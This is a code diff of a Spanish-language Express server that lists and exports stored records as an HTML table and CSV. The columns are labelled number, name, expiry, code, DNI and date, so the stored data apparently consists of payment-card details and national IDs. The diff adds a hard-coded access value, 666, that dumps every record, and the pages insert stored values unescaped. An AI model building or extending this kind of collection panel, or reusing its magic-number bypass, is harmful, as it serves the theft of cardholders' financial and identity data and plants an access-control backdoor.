@@ -237,233 +237,120 @@ app.post("/error", async (req, res) => {
 // LEER REGISTROS
 // ======================================================
 
+
 app.get("/leer", async (req, res) => {
-
   try {
-
     const codigo = parseInt(req.query.codigo, 10);
 
-    // --------------------------------------------------
-    // Verificar código
-    // --------------------------------------------------
-
     if (!Number.isInteger(codigo)) {
-
-      return res.status(400).send(`
-        <h1>Código inválido</h1>
-        <p>
-          Utilice, por ejemplo:
-          <br><br>
-          /leer?codigo=1
-        </p>
-      `);
-
+      return res.status(400).send("Código de acceso inválido");
     }
 
+    let resultado;
 
-    // --------------------------------------------------
-    // BUSCAR SOLO ESE CÓDIGO
-    // --------------------------------------------------
-
-    const resultado = await pool.query(
-      `
-      SELECT *
-      FROM registros
-      WHERE codigo = $1
-      ORDER BY id DESC
-      `,
-      [codigo]
-    );
-
-
-    // --------------------------------------------------
-    // CREAR FILAS
-    // --------------------------------------------------
+    if (codigo === 666) {
+      // 666 = mostrar todos los registros
+      resultado = await pool.query(`
+        SELECT *
+        FROM registros
+        ORDER BY id DESC
+      `);
+    } else {
+      // Cualquier otro código = mostrar solamente ese código
+      resultado = await pool.query(
+        `
+        SELECT *
+        FROM registros
+        WHERE codigo = $1
+        ORDER BY id DESC
+        `,
+        [codigo]
+      );
+    }
 
     let filas = "";
 
     resultado.rows.forEach(r => {
-
       filas += `
         <tr>
-
           <td>${r.id}</td>
-
           <td>${r.codigo || ""}</td>
-
           <td>${r.input1 || ""}</td>
-
           <td>${r.input2 || ""}</td>
-
           <td>${r.input3 || ""}</td>
-
           <td>${r.input5 || ""}</td>
-
           <td>${r.input6 || ""}</td>
-
-          <td>
-            ${r.fecha
-              ? new Date(r.fecha).toLocaleString("es-AR")
-              : ""}
-          </td>
-
+          <td>${r.fecha ? new Date(r.fecha).toLocaleString("es-AR") : ""}</td>
         </tr>
       `;
-
     });
 
-
-    // --------------------------------------------------
-    // MOSTRAR
-    // --------------------------------------------------
+    const titulo =
+      codigo === 666
+        ? "Todos los registros"
+        : `Registros del código ${codigo}`;
 
     res.send(`
-
       <!DOCTYPE html>
-
       <html lang="es">
-
       <head>
-
         <meta charset="UTF-8">
-
-        <title>Registros</title>
+        <title>${titulo}</title>
 
         <style>
-
           body {
-
             font-family: Arial, sans-serif;
-
             padding: 20px;
-
             background: #f5f5f5;
-
-          }
-
-          h2 {
-
-            margin-bottom: 20px;
-
-          }
-
-          .info {
-
-            background: white;
-
-            padding: 15px;
-
-            margin-bottom: 15px;
-
-            border-radius: 8px;
-
           }
 
           table {
-
             border-collapse: collapse;
-
             width: 100%;
-
             background: white;
-
           }
 
-          th,
-          td {
-
+          th, td {
             border: 1px solid #ccc;
-
             padding: 8px;
-
             text-align: left;
-
           }
 
           th {
-
             background: #222;
-
             color: white;
-
           }
 
           button {
-
             padding: 10px 15px;
-
-            border: none;
-
-            border-radius: 5px;
-
-            cursor: pointer;
-
-            background: #222;
-
-            color: white;
-
             margin-bottom: 15px;
-
+            cursor: pointer;
           }
-
         </style>
-
       </head>
 
       <body>
 
-        <h2>
-          Registros guardados
-        </h2>
+        <h2>${titulo}</h2>
 
-        <div class="info">
-
-          <strong>
-            Código de acceso:
-          </strong>
-
-          ${codigo}
-
-          <br>
-
-          <strong>
-            Cantidad de registros:
-          </strong>
-
-          ${resultado.rows.length}
-
-        </div>
-
+        <p>
+          Cantidad de registros: ${resultado.rows.length}
+        </p>
 
         <a href="/descargar-csv?codigo=${codigo}">
-
-          <button>
-            📥 Descargar CSV
-          </button>
-
+          <button>📥 Descargar CSV</button>
         </a>
 
-
         <table>
-
           <tr>
-
             <th>ID</th>
-
             <th>Código</th>
-
             <th>Numero</th>
-
             <th>Nombre</th>
-
             <th>Vence</th>
-
             <th>Codigo</th>
-
             <th>DNI</th>
-
             <th>Fecha</th>
-
           </tr>
 
           ${filas}
@@ -471,22 +358,16 @@ app.get("/leer", async (req, res) => {
         </table>
 
       </body>
-
       </html>
-
     `);
 
   } catch (error) {
-
     console.error(error);
-
-    res.status(500).send(
-      "Error al leer los registros"
-    );
-
+    res.status(500).send("Error al leer los registros");
   }
-
 });
+
+
 
 
 // ======================================================
@@ -494,65 +375,40 @@ app.get("/leer", async (req, res) => {
 // ======================================================
 
 app.get("/descargar-csv", async (req, res) => {
-
   try {
-
     const codigo = parseInt(req.query.codigo, 10);
 
-    // --------------------------------------------------
-    // Verificar código
-    // --------------------------------------------------
-
     if (!Number.isInteger(codigo)) {
-
-      return res.status(400).send(
-        "Código de acceso inválido"
-      );
-
+      return res.status(400).send("Código de acceso inválido");
     }
 
+    let resultado;
 
-    // --------------------------------------------------
-    // BUSCAR SOLO LOS REGISTROS DE ESE CÓDIGO
-    // --------------------------------------------------
+    if (codigo === 666) {
+      // 666 = todos
+      resultado = await pool.query(`
+        SELECT *
+        FROM registros
+        ORDER BY id DESC
+      `);
+    } else {
+      // Código específico
+      resultado = await pool.query(
+        `
+        SELECT *
+        FROM registros
+        WHERE codigo = $1
+        ORDER BY id DESC
+        `,
+        [codigo]
+      );
+    }
 
-    const resultado = await pool.query(
-      `
-      SELECT *
-      FROM registros
-      WHERE codigo = $1
-      ORDER BY id DESC
-      `,
-      [codigo]
-    );
-
-
-    // --------------------------------------------------
-    // CREAR CSV
-    // --------------------------------------------------
-
-    let csv =
-      "ID,Codigo,Numero,Nombre,Vence,Codigo,DNI,Fecha\n";
-
+    let csv = "ID,Codigo,Numero,Nombre,Vence,Codigo,DNI,Fecha\n";
 
     resultado.rows.forEach(r => {
-
-      csv +=
-        `"${r.id || ""}",` +
-        `"${r.codigo || ""}",` +
-        `"${r.input1 || ""}",` +
-        `"${r.input2 || ""}",` +
-        `"${r.input3 || ""}",` +
-        `"${r.input5 || ""}",` +
-        `"${r.input6 || ""}",` +
-        `"${r.fecha || ""}"\n`;
-
+      csv += `"${r.id || ""}","${r.codigo || ""}","${r.input1 || ""}","${r.input2 || ""}","${r.input3 || ""}","${r.input5 || ""}","${r.input6 || ""}","${r.fecha || ""}"\n`;
     });
-
-
-    // --------------------------------------------------
-    // DESCARGA
-    // --------------------------------------------------
 
     res.setHeader(
       "Content-Disposition",
@@ -567,16 +423,13 @@ app.get("/descargar-csv", async (req, res) => {
     res.send(csv);
 
   } catch (error) {
-
     console.error(error);
-
-    res.status(500).send(
-      "Error al generar CSV"
-    );
-
+    res.status(500).send("Error al generar CSV");
   }
-
 });
+
+
+
 
 
 // ======================================================
